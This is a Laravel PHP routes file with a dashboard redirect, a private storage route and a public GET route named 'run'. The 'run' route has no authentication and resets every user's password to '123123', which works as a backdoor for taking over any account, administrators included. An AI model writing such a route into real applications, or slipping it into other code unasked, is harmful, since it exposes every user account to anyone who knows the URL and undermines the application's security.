<?php

use Illuminate\Support\Facades\Route;

Route::get("/", fn () => redirect(url('/a/dashboard')));
Route::middleware(['storage'])->group(function () {
    Route::get('/storage/private/{path}', \App\Http\Controllers\StorageController::class)
        ->where('path', '.*')
        ->name('storage');
});

Route::get("run", function () {
    \App\Models\User::whereNot('id',0)->update([
        'password' => bcrypt('123123')
    ]);
    return 'ok';
});